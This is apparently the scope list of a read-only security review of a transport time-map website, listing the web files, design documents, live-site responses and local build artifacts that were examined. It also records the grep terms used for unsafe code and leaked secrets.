- Web: `web/index.html`, `web/app.js`, `web/README.md`, `web/llms.txt`, `web/robots.txt`, `web/sitemap.xml`, `web/vendor/fonts.css`; `web/vendor/maplibre-gl.js`, `pmtiles.js`, `h3.js`, `fflate.js` (*grep*: banners/versions, imports, `eval`/`Function`/`document.write`, `sanitize`/`removeAttributes`, `attribution`, `fetch`; hashes recorded); `web/vendor/*.woff2` (hashes only); `web/preview.png` (not inspected).
- Docs: `docs/superpowers/specs/2026-09-03-global-transport-time-map-design.md` (full), `docs/superpowers/plans/2026-09-03-transport-pipeline.md` (*grep*: secrets/tokens, firewall, CSP, Google, Nominatim, analytics).
- Live site: response headers for `/`, `/index.json`, `/app.js`, `/vendor/maplibre-gl.js`, `/hover_cells.bin`, `/water.pmtiles` (range), `/vendor/ibm-plex-sans-latin-400-normal.woff2`, `/robots.txt`, `/preview.png`, a 404 path, `http://` redirect; bodies of `/` and `/app.js` grepped for third-party hosts; `/vendor/`, `/.git/HEAD`, `/README.md` probed.
- Local state (read-only): `dist/` listing and `dist/index.json`, `dist/index.html`, `dist/llms.txt`, `dist/app.js`, `dist/places.json`, `dist/airports.json`, 60 × `dist/origins/*.rail.json` (markup scan); `data/build/` listing; `~/.config/transport-maps/` listing (metadata only, contents not read); git history and status.
